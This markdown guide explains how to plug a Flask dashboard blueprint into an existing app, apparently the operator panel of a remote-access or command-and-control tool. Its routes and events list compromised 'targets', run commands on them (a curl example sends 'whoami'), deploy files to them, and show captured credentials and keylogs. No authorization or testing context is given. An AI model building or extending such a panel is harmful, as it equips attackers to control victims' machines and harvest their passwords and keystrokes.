# 🔧 Dashboard Integration Guide

## Quick Integration (5 Minutes)

### Step 1: Register the Blueprint

Find your main Flask application file (likely `web_app.py`, `main.py`, or `app.py`) and add:

```python
# At the top with other imports
from complete_dashboard_routes import dashboard_bp

# After creating your Flask app
app = Flask(__name__)

# Register the dashboard blueprint
app.register_blueprint(dashboard_bp)
```

### Step 2: Update Login Redirect

Find your login route and update the redirect:

```python
@app.route('/login', methods=['POST'])
def login():
    # ... your authentication logic ...
    
    if user_authenticated:
        # OLD: return redirect('/dashboard')
        # NEW:
        return redirect(url_for('dashboard.overview'))
```

### Step 3: Test It

```bash
# Start your Flask server
python web_app.py

# Visit in browser
http://localhost:5000/dashboard/overview
```

That's it! The dashboard should now be working with mock data.

---

## Connecting Real Data (30-60 Minutes)

### Option A: Quick & Dirty (Testing)

Keep the mock data for now. The dashboard will work perfectly for testing and demonstration.

### Option B: Full Integration

Edit `complete_dashboard_routes.py` and replace mock data with your actual backend calls.

#### Example: Targets

**Before (Mock):**
```python
@dashboard_bp.route('/api/targets')
@login_required
def api_targets():
    targets = [
        {'id': 'target_001', 'hostname': 'WORKSTATION-01', ...}
    ]
    return jsonify({'targets': targets})
```

**After (Real):**
```python
@dashboard_bp.route('/api/targets')
@login_required
def api_targets():
    # Import your database/connection manager
    from your_backend import get_all_targets
    
    # Get real targets
    targets = get_all_targets()
    
    # Format for frontend (if needed)
    formatted_targets = [
        {
            'id': t.id,
            'hostname': t.hostname,
            'ip_address': t.ip_address,
            'os_info': t.os_info,
            'user_info': t.user_info,
            'first_seen': t.first_seen.isoformat(),
            'last_seen': t.last_seen.isoformat(),
            'is_active': t.is_active,
            'connection_count': t.connection_count
        }
        for t in targets
    ]
    
    return jsonify({'targets': formatted_targets})
```

#### Example: Commands

**Before (Mock):**
```python
@dashboard_bp.route('/api/execute', methods=['POST'])
@login_required
def api_execute():
    data = request.get_json()
    return jsonify({'success': True, 'output': 'Mock output'})
```

**After (Real):**
```python
@dashboard_bp.route('/api/execute', methods=['POST'])
@login_required
def api_execute():
    data = request.get_json()
    target_id = data.get('target_id')
    command = data.get('command')
    
    # Import your command execution system
    from your_backend import execute_command_on_target
    
    try:
        # Execute the actual command
        result = execute_command_on_target(target_id, command)
        
        return jsonify({
            'success': True,
            'output': result.output,
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500
```

---

## WebSocket Integration

If you have existing WebSocket/Socket.IO setup:

### Step 1: Import in your WebSocket handler

```python
from flask_socketio import SocketIO, emit

socketio = SocketIO(app)
```

### Step 2: Emit events when things happen

```python
# When a target connects
@socketio.on('target_connected')
def handle_target_connected(target_data):
    emit('target_connected', {
        'target_id': target_data['id'],
        'hostname': target_data['hostname']
    }, broadcast=True)

# When credentials are captured
def on_credential_captured(credential):
    socketio.emit('new_credential', {
        'target_hostname': credential.target_hostname,
        'username': credential.username
    }, broadcast=True)

# When a command completes
def on_command_complete(result):
    socketio.emit('command_result', {
        'success': result.success,
        'output': result.output
    }, broadcast=True)
```

The dashboard JavaScript is already listening for these events!

---

## Database Integration Examples

### SQLAlchemy

```python
from your_models import Target, Credential, Keylog, SystemLog

@dashboard_bp.route('/api/targets')
@login_required
def api_targets():
    targets = Target.query.all()
    return jsonify({
        'targets': [t.to_dict() for t in targets]
    })

@dashboard_bp.route('/api/credentials')
@login_required
def api_credentials():
    credentials = Credential.query.all()
    return jsonify({
        'credentials': [c.to_dict() for c in credentials]
    })
```

### Raw SQL

```python
import sqlite3

@dashboard_bp.route('/api/targets')
@login_required
def api_targets():
    conn = sqlite3.connect('your_database.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM targets WHERE is_active = 1')
    rows = cursor.fetchall()
    
    targets = [
        {
            'id': row[0],
            'hostname': row[1],
            'ip_address': row[2],
            # ... map other columns
        }
        for row in rows
    ]
    
    conn.close()
    return jsonify({'targets': targets})
```

### MongoDB

```python
from pymongo import MongoClient

client = MongoClient('mongodb://localhost:27017/')
db = client['your_database']

@dashboard_bp.route('/api/targets')
@login_required
def api_targets():
    targets = list(db.targets.find({'is_active': True}))
    
    # Convert ObjectId to string
    for target in targets:
        target['_id'] = str(target['_id'])
    
    return jsonify({'targets': targets})
```

---

## File Operations Integration

### Upload Handler

```python
@dashboard_bp.route('/api/files/upload', methods=['POST'])
@login_required
def api_upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        file.save(file_path)
        
        # Optional: Store in database
        from your_models import UploadedFile
        uploaded_file = UploadedFile(
            filename=filename,
            size=os.path.getsize(file_path),
            uploaded_by=session.get('user_id'),
            uploaded_at=datetime.now()
        )
        db.session.add(uploaded_file)
        db.session.commit()
        
        logger.info(f"File uploaded: {filename}")
        return jsonify({'success': True, 'filename': filename})
    
    return jsonify({'error': 'File type not allowed'}), 400
```

### Deploy to Target

```python
@dashboard_bp.route('/api/files/deploy', methods=['POST'])
@login_required
def api_deploy_file():
    data = request.get_json()
    filename = data.get('filename')
    target_id = data.get('target_id')
    
    # Import your file transfer system
    from your_backend import send_file_to_target
    
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    
    if not os.path.exists(file_path):
        return jsonify({'error': 'File not found'}), 404
    
    try:
        # Send file to target
        result = send_file_to_target(target_id, file_path)
        
        if result.success:
            return jsonify({'success': True})
        else:
            return jsonify({'error': result.error}), 500
    
    except Exception as e:
        logger.error(f"Error deploying file: {e}")
        return jsonify({'error': str(e)}), 500
```

---

## Testing Your Integration

### 1. Test Pages Load

Visit each page and verify it loads:
- http://localhost:5000/dashboard/overview
- http://localhost:5000/dashboard/targets
- http://localhost:5000/dashboard/commands
- http://localhost:5000/dashboard/files
- http://localhost:5000/dashboard/credentials
- http://localhost:5000/dashboard/keylogs
- http://localhost:5000/dashboard/logs
- http://localhost:5000/dashboard/settings
- http://localhost:5000/dashboard/help

### 2. Test API Endpoints

Use curl or Postman:

```bash
# Test targets API
curl -X GET http://localhost:5000/dashboard/api/targets \
  -H "Cookie: session=YOUR_SESSION_COOKIE"

# Test command execution
curl -X POST http://localhost:5000/dashboard/api/execute \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d '{"target_id": "target_001", "command": "whoami"}'
```

### 3. Test WebSocket

Open browser console on dashboard page:

```javascript
// Should see connection message
socket.on('connect', () => {
    console.log('WebSocket connected!');
});

// Test emitting event
socket.emit('test_event', {data: 'test'});
```

### 4. Test Real-Time Updates

1. Open dashboard in browser
2. Trigger an event (e.g., new target connection)
3. Verify dashboard updates without refresh

---

## Common Issues & Solutions

### Issue: "Blueprint not found"

**Solution:** Make sure you imported and registered the blueprint:
```python
from complete_dashboard_routes import dashboard_bp
app.register_blueprint(dashboard_bp)
```

### Issue: "Template not found"

**Solution:** Verify templates are in correct location:
```
your_project/
  templates/
    dashboard/
      base.html
      overview.html
      ...
```

### Issue: "CSS not loading"

**Solution:** Check static files configuration:
```python
app = Flask(__name__, 
            static_folder='static',
            static_url_path='/static')
```

### Issue: "401 Unauthorized on API calls"

**Solution:** Ensure user is logged in and session is valid:
```python
@login_required
def your_route():
    print(f"User: {session.get('user_id')}")  # Debug
    ...
```

### Issue: "WebSocket not connecting"

**Solution:** Install and configure Socket.IO:
```bash
pip install flask-socketio python-socketio
```

```python
from flask_socketio import SocketIO
socketio = SocketIO(app, cors_allowed_origins="*")
```

---

## Performance Optimization

### 1. Database Query Optimization

```python
# Bad: N+1 queries
targets = Target.query.all()
for target in targets:
    target.commands  # Separate query for each target

# Good: Eager loading
targets = Target.query.options(
    joinedload(Target.commands)
).all()
```

### 2. Caching

```python
from flask_caching import Cache

cache = Cache(app, config={'CACHE_TYPE': 'simple'})

@dashboard_bp.route('/api/targets')
@login_required
@cache.cached(timeout=30)  # Cache for 30 seconds
def api_targets():
    # Expensive database query
    targets = get_all_targets()
    return jsonify({'targets': targets})
```

### 3. Pagination

```python
@dashboard_bp.route('/api/logs')
@login_required
def api_logs():
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('per_page', 50, type=int)
    
    logs = SystemLog.query.paginate(
        page=page,
        per_page=per_page,
        error_out=False
    )
    
    return jsonify({
        'logs': [log.to_dict() for log in logs.items],
        'total': logs.total,
        'pages': logs.pages,
        'current_page': page
    })
```

---

## Security Checklist

- [ ] All routes have `@login_required` decorator
- [ ] CSRF tokens on all forms
- [ ] Input validation on all user inputs
- [ ] File upload restrictions enforced
- [ ] SQL injection prevention (use parameterized queries)
- [ ] XSS prevention (escape all user input)
- [ ] Rate limiting on API endpoints
- [ ] HTTPS in production
- [ ] Secure session configuration
- [ ] Password hashing (never store plain text)

---

## Production Deployment

### 1. Environment Variables

```python
import os

app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY')
app.config['DATABASE_URL'] = os.environ.get('DATABASE_URL')
```

### 2. WSGI Server

```bash
# Install gunicorn
pip install gunicorn

# Run with gunicorn
gunicorn -w 4 -b 0.0.0.0:5000 web_app:app
```

### 3. Nginx Configuration

```nginx
server {
    listen 80;
    server_name your-domain.com;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    location /socket.io {
        proxy_pass http://127.0.0.1:5000/socket.io;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
```

---

## Next Steps

1. ✅ Complete basic integration (5 min)
2. ✅ Test with mock data (10 min)
3. ✅ Connect real database (30-60 min)
4. ✅ Test all features (30 min)
5. ✅ Deploy to production (varies)

**Total time: 1-2 hours for full integration**

---

## Need Help?

Check these files:
- `DASHBOARD_IMPLEMENTATION_COMPLETE.md` - Full documentation
- `complete_dashboard_routes.py` - All routes with examples
- `templates/dashboard/base.html` - Base template structure
- `static/css/dashboard.css` - All styling

Good luck! 🚀
